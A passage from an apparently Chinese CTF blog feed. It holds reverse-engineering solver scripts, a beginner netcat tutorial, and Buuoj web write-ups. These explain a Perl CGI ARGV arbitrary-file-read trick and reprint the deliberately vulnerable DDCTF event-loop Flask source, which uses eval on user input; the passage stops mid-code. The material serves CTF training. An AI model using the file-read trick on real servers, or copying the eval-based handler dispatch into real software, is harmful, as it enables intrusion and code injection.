loading="lazy"><p>长度32</p><img src="/article/2020hxb-Writeup-cOMING/17aa83fa3a88db01f27c8fb3d41c5e5f.png" class="" loading="lazy"><p>exp：</p><pre class="language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        String a &#x3D; &quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;;        char v11;        int v13;        for (int i &#x3D;0; i&lt;32; i++)        &#123;            v11 &#x3D; a.charAt(i);            v13 &#x3D; i ^ (int)v11;            System.out.print((char)v13);        &#125;    &#125;&#125;</code></pre><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>反编译py</p><pre class="language-none"><code class="language-none">python3 pyinstxtractor.py ReMe.exe</code></pre><img src="/article/2020hxb-Writeup-cOMING/1393ddb113bda2babe004c8a7bd44c13.png" class="" loading="lazy"><p>010打开</p><img src="/article/2020hxb-Writeup-cOMING/38a8bb796f44edf49bb8ec9ae28a850c.png" class="" loading="lazy"><p>置换之后：</p><img src="/article/2020hxb-Writeup-cOMING/0b91b5d7322cfcb630981982098feea8.png" class="" loading="lazy"><p>改后缀：ReMe.pyc</p><pre class="language-none"><code class="language-none">uncompyle6 ReMe.pycλ uncompyle6 ReMe.pyc# uncompyle6 version 3.7.4# Python bytecode 3.7 (3394)# Decompiled from: Python 3.8.5 (tags&#x2F;v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ReMe.py# Compiled at: 1995-09-28 00:18:56# Size of source mod 2**32: 272 bytesimport sys, hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(num):    result &#x3D; []    while num !&#x3D; 1:        num &#x3D; num * 3 + 1 if num % 2 else num &#x2F;&#x2F; 2        result.append(num)    return resultif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(&#39;Your input is not the FLAG!&#39;)    inp &#x3D; input()    if len(inp) !&#x3D; 27:        print(&#39;length error!&#39;)        sys.exit(-1)    for i, ch in enumerate(inp):        ret_list &#x3D; func(ord(ch))        s &#x3D; &#39;&#39;        for idx in range(len(ret_list)):            s +&#x3D; str(ret_list[idx])            s +&#x3D; str(ret_list[(len(ret_list) - idx - 1)])        md5 &#x3D; hashlib.md5()        md5.update(s.encode(&#39;utf-8&#39;))        if md5.hexdigest() !&#x3D; check[i]:            sys.exit(i)    md5 &#x3D; hashlib.md5()    md5.update(inp.encode(&#39;utf-8&#39;))    print(&#39;You win!&#39;)    print(&#39;flag&#123;&#39; + md5.hexdigest() + &#39;&#125;&#39;)# okay decompiling ReMe.pyc</code></pre><p>exp:</p><pre class="language-none"><code class="language-none">import hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(number):    ret &#x3D; []    while number !&#x3D; 1:        number &#x3D; number * 3 + 1 if number % 2 else number &#x2F;&#x2F; 2        ret.append(number)    return retfor i in range(1,128):    a &#x3D; func(i)    ans &#x3D; &quot;&quot;    for j in range(len(a)):        ans +&#x3D; str(a[j])        ans +&#x3D; str(a[(len(a) - j - 1)])    md5 &#x3D; hashlib.md5()    md5.update(ans.encode(&#39;utf-8&#39;))    b &#x3D; md5.hexdigest()    for j in range(27):        if b &#x3D;&#x3D; check[j]:            print chr(i),j</code></pre><p>跑出 flag{My_M@th_3X+1_R3v_Te5t} 再跑md5</p><img src="/article/2020hxb-Writeup-cOMING/ac2500682b8e1112e9a89ce1b1f97465.png" class="" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netcat 网络测试工具</title>
      <link href="article/Netcat/"/>
      <url>article/Netcat/</url>
      
        <content type="html"><![CDATA[<h2 id="这里是中国科技大学-taoky-写的一篇文章-nc是什么"><a href="#这里是中国科技大学-taoky-写的一篇文章-nc是什么" class="headerlink" title="这里是中国科技大学@taoky 写的一篇文章: nc是什么?"></a><strong>这里是中国科技大学@taoky 写的一篇文章: nc是什么?</strong></h2><p>请仔细阅读，一般二进制bin方向可能用到nc的地方会很多。</p><hr><p>nc&#x2F;ncat 是 netcat 的缩写，它可以读写 TCP 与 UDP 端口——或许你看不懂这句话，这没有关系。简单地说，它可以在字符界面下，让你和服务器沟通交流。<br>一般来说，有很多题目都会要求你使用 nc 连接到他们的服务器，并且进行交互，获得 flag</p><h2 id="如何安装-nc？"><a href="#如何安装-nc？" class="headerlink" title="如何安装 nc？"></a>如何安装 nc？</h2><p><code>nc</code> 命令在 macOS 中是自带的，在 Linux 中一般自带，或是可以使用相应的软件包管理器安装（如在 Debian&#x2F;Ubuntu 中这个包名叫 netcat）。</p><p>当然，如果你在看这篇手册，你的操作系统很有可能是 Windows。它不自带 <code>nc</code>，尽管可以用 WSL 或者虚拟机的方式解决，但是如果你觉得这样太麻烦了，也有另外一些方法。</p><h3 id="使用静态链接的-ncat-程序"><a href="#使用静态链接的-ncat-程序" class="headerlink" title="使用静态链接的 ncat 程序"></a>使用静态链接的 ncat 程序</h3><p>前往 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">此处</a> (github链接)下载此程序。我们也在这里提供了一份。下载下来即可。</p><p><a href="/download/ncat.zip">ncat.zip</a></p><blockquote><p>注：nc&#x2F;ncat 事实上是两个不同的程序，但在我们接下来的使用上，基本没有区别。ncat 是由 Nmap 项目开发的“重置版的 Netcat”。</p></blockquote><h4 id="Q-我的杀毒软件报毒怎么办"><a href="#Q-我的杀毒软件报毒怎么办" class="headerlink" title="Q:我的杀毒软件报毒怎么办"></a>Q:我的杀毒软件报毒怎么办</h4><p>如果你不相信此来源，也可以下载 nmap（一个网络探测、扫描工具），它会附带一个 ncat。</p><h2 id="如何使用-nc"><a href="#如何使用-nc" class="headerlink" title="如何使用 nc?"></a>如何使用 nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接双击，你会看到一个窗口一扫而过——这是正常现象。你需要使用「命令提示符」或者「PowerShell」来访问这个程序。</p><p>Windows 10 中，你可以使用资源管理器 -&gt; 文件来在你存放 nc 的目录中打开命令提示符或 PowerShell。</p><img src="/article/Netcat/explorer-1024x510.png" class="" loading="lazy"><h6 id="在-Windows-资源管理器中打开命令提示符或-PowerShell"><a href="#在-Windows-资源管理器中打开命令提示符或-PowerShell" class="headerlink" title="在 Windows 资源管理器中打开命令提示符或 PowerShell"></a>在 Windows 资源管理器中打开命令提示符或 PowerShell</h6><p>可以直接在<code>ncat.exe</code>所在目录，按住<code>Shift+鼠标右键</code>点击<code>在此处打开Powershell窗口</code>输入<code>ncat</code></p><p>或者，你也可以在开始菜单 -&gt; Windows 系统中打开命令提示符，或者在开始菜单 -&gt; Windows PowerShell 中打开 PowerShell，也可以按住<code>win标+R</code>弹出<code>运行</code>窗口输入<code>cmd</code>，然后使用 cd 命令转移到对应的目录：输入 cd 文件夹名 可以让你转移到对应的文件夹，输入 cd .. 可以让你转移到上面一层目录。使用 dir 命令，可以显示当前目录下所有文件。同时，使用 Tab 键可以帮助你补全名称。</p><p>当跳转到你存放 nc 的文件夹后：</p><ul><li>如果你使用的是 PowerShell（蓝色背景），输入 .&#x2F;ncat（根据 nc 对应的名称不同而不同）。</li><li>如果你使用的是命令提示符（黑色背景），输入 ncat（根据 nc 对应的名称不同而不同）。</li></ul><p>当显示以下内容时，说明你成功运行了它。</p><img src="/article/Netcat/image-20210220172523253.png" class="" title="nc" loading="lazy"><h6 id="成功运行-ncat"><a href="#成功运行-ncat" class="headerlink" title="成功运行 ncat"></a>成功运行 ncat</h6><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>打开「终端」，输入 <code>nc</code>。</p><pre class="language-none"><code class="language-none">$ ncusage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]  [-s source_ip_address] [-w timeout] [-X proxy_version]  [-x proxy_address[:port]] [hostname] [port[s]]</code></pre><p>出现了类似上面的输出，说明运行成功了。</p><img src="/article/Netcat/image-20210220170815879.png" class="" title="image-20210220170815879" loading="lazy"><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在我们使用浏览器上网的时候，我们和服务器使用了 HTTP 协议进行连接。关于 HTTP 协议的更多细节，你需要自己上网搜索。一般来说，默认是 80 端口。</p><p>我们可以使用 nc，尝试一次与网页服务器的连接，以百度为例。</p><p>输入 <code>nc www.baidu.com 80</code>（或者 <code>ncat www.baidu.com 80</code>，或者 <code>./ncat www.baidu.com 80</code>，请根据以上的介绍自行修改），程序会等待你的输入。</p><p>输入 GET &#x2F; HTTP&#x2F;1.0。这表示，我们使用 HTTP&#x2F;1.0 这个协议版本，用 GET 的方式请求根 &#x2F;。输入<strong>两下</strong>回车，代表我们的 HTTP 请求完成。如果你的网络畅通，百度的网页服务器会立刻返回大量信息，可以自行搜索，了解它们的含义。现在，你成功（在不使用浏览器的情况下）完成了一次与百度网站的连接！</p><img src="/article/Netcat/image-20210220172713535.png" class="" title="nc success" loading="lazy"><h6 id="内容可能不同，返回类似即表示成功"><a href="#内容可能不同，返回类似即表示成功" class="headerlink" title="内容可能不同，返回类似即表示成功"></a>内容可能不同，返回类似即表示成功</h6><p>如果你成功了，那么你可以开始愉快地完成我们的题目了！</p><hr><p>end</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj WEB Write-up</title>
      <link href="article/Buuoj-WEB-Write-up/"/>
      <url>article/Buuoj-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><p>刷题，buuoj记录</p><span id="more"></span><hr><h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129165730787.png" class="" title="image-20201129165730787" loading="lazy"><p>咱也不懂perl…</p><p>发现了文件上传的地方</p><img src="/article/Buuoj-WEB-Write-up/image-20201129165825648.png" class="" title="image-20201129165825648" loading="lazy"><p>发现会把上传的文件直接显示在网页上</p><p>查了下原理</p><h5 id="perlparam-任意文件读取"><a href="#perlparam-任意文件读取" class="headerlink" title="perlparam()任意文件读取"></a>perlparam()任意文件读取</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name type-declaration">my</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span>        <span class="token keyword">print</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p> 如上代码将上传的文件原样输出到网页 </p><p>知识点： param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 </p><p>ARGV——命令行参数</p><p>于是抓包</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170225902.png" class="" title="image-20201129170225902" loading="lazy"><p>修改为：</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170548925.png" class="" title="image-20201129170548925" loading="lazy"><hr><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129170732360.png" class="" title="image-20201129170732360" loading="lazy"><p>source code</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token 